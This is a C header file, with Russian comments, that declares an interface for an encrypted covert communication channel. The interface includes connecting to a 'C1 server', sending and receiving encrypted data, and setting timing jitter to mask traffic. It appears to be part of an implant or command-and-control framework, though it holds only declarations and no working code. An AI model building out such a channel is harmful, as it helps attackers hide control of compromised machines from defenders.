/**
 * @file crypto_channel.h
 * @brief Заголовочный файл для интеграции криптографического модуля и скрытых каналов связи
 * @author iamtomasanderson@gmail.com (https://github.com/Personaz1/)
 * @date 2023-09-05
 */

#ifndef CRYPTO_CHANNEL_H
#define CRYPTO_CHANNEL_H

#include <stddef.h>
#include <stdint.h>

#include "../network/covert_channel.h"
#include "../crypto/crypto_utils.h"

/**
 * @brief Указатель на структуру контекста криптографического канала
 */
typedef struct CryptoChannelContext* CryptoChannelHandle;

/**
 * @brief Инициализирует криптографический канал связи
 * 
 * @param config Конфигурация скрытого канала
 * @param crypto_alg Алгоритм шифрования
 * @param crypto_key Ключ шифрования
 * @param crypto_key_len Длина ключа шифрования
 * @param crypto_iv Вектор инициализации (может быть NULL для некоторых алгоритмов)
 * @param crypto_iv_len Длина вектора инициализации
 * @param use_integrity Использовать ли проверку целостности
 * @param hash_alg Алгоритм хеширования для проверки целостности
 * @return CryptoChannelHandle Дескриптор канала или NULL при ошибке
 */
CryptoChannelHandle crypto_channel_init(
    const CovertChannelConfig *config, 
    CryptoAlgorithm crypto_alg,
    const unsigned char *crypto_key,
    size_t crypto_key_len,
    const unsigned char *crypto_iv,
    size_t crypto_iv_len,
    int use_integrity,
    HashAlgorithm hash_alg
);

/**
 * @brief Устанавливает соединение с C1 сервером через криптографический канал
 * 
 * @param handle Дескриптор криптографического канала
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
int crypto_channel_connect(CryptoChannelHandle handle);

/**
 * @brief Отправляет данные через криптографический канал с шифрованием
 * 
 * @param handle Дескриптор криптографического канала
 * @param data Данные для отправки
 * @param data_len Размер данных
 * @return int Количество отправленных байт или отрицательное значение при ошибке
 */
int crypto_channel_send(CryptoChannelHandle handle, const unsigned char *data, size_t data_len);

/**
 * @brief Получает и дешифрует данные через криптографический канал
 * 
 * @param handle Дескриптор криптографического канала
 * @param buffer Буфер для полученных данных
 * @param buffer_size Размер буфера
 * @return int Количество полученных байт или отрицательное значение при ошибке
 */
int crypto_channel_receive(CryptoChannelHandle handle, unsigned char *buffer, size_t buffer_size);

/**
 * @brief Проверяет состояние соединения криптографического канала
 * 
 * @param handle Дескриптор криптографического канала
 * @return int 1, если соединение установлено, 0 - если нет, -1 при ошибке
 */
int crypto_channel_is_connected(CryptoChannelHandle handle);

/**
 * @brief Устанавливает параметры jitter для маскировки трафика
 * 
 * @param handle Дескриптор криптографического канала
 * @param min_ms Минимальная задержка в миллисекундах
 * @param max_ms Максимальная задержка в миллисекундах
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
int crypto_channel_set_jitter(CryptoChannelHandle handle, unsigned int min_ms, unsigned int max_ms);

/**
 * @brief Освобождает ресурсы, выделенные для криптографического канала
 * 
 * @param handle Дескриптор криптографического канала
 */
void crypto_channel_cleanup(CryptoChannelHandle handle);

#endif /* CRYPTO_CHANNEL_H */ 